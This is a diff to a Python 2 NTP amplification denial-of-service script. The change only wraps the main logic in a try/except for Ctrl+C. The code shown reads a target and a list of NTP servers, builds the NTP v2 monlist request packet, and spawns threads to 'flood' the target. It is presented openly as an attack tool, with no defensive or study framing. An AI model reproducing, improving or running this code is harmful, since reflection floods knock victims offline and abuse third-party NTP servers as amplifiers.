@@ -33,48 +33,52 @@ def printhelp():
 	print "MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS"
 	exit(0)
 
-if len(sys.argv) < 4:
-	printhelp()
-#Fetch Args
-target = sys.argv[1]
+try:
+	if len(sys.argv) < 4:
+		printhelp()
+	#Fetch Args
+	target = sys.argv[1]
 
-#Help out idiots
-if target in ("help","-h","h","?","--h","--help","/?"):
-	printhelp()
+	#Help out idiots
+	if target in ("help","-h","h","?","--h","--help","/?"):
+		printhelp()
 
-ntpserverfile = sys.argv[2]
-numberthreads = int(sys.argv[3])
-#System for accepting bulk input
-ntplist = []
-currentserver = 0
-with open(ntpserverfile) as f:
-    ntplist = f.readlines()
+	ntpserverfile = sys.argv[2]
+	numberthreads = int(sys.argv[3])
+	#System for accepting bulk input
+	ntplist = []
+	currentserver = 0
+	with open(ntpserverfile) as f:
+	    ntplist = f.readlines()
 
-#Make sure we dont out of bounds
-if  numberthreads > int(len(ntplist)):
-	print "Attack Aborted: More threads than servers"
-	print "Next time dont create more threads than servers"
-	exit(0)
+	#Make sure we dont out of bounds
+	if  numberthreads > int(len(ntplist)):
+		print "Attack Aborted: More threads than servers"
+		print "Next time dont create more threads than servers"
+		exit(0)
 
-#Magic Packet aka NTP v2 Monlist Packet
-data = "\x17\x00\x03\x2a" + "\x00" * 4
+	#Magic Packet aka NTP v2 Monlist Packet
+	data = "\x17\x00\x03\x2a" + "\x00" * 4
 
-#Hold our threads
-threads = []
-print "Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads"
-print "Use CTRL+C to stop attack"
+	#Hold our threads
+	threads = []
+	print "Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads"
+	print "Use CTRL+C to stop attack"
 
-#Thread spawner
-for n in range(numberthreads):
-    thread = threading.Thread(target=deny)
-    thread.daemon = True
-    thread.start()
+	#Thread spawner
+	for n in range(numberthreads):
+	    thread = threading.Thread(target=deny)
+	    thread.daemon = True
+	    thread.start()
 
-    threads.append(thread)
+	    threads.append(thread)
 
-#In progress!
-print "Sending..."
+	#In progress!
+	print "Sending..."
 
-#Keep alive so ctrl+c still kills all them threads
-while True:
-	time.sleep(1)
+	#Keep alive so ctrl+c still kills all them threads
+	while True:
+		time.sleep(1)
+except KeyboardInterrupt:
+	print("Script Stopped [ctrl + c]... Shutting down")
+	# Script ends here
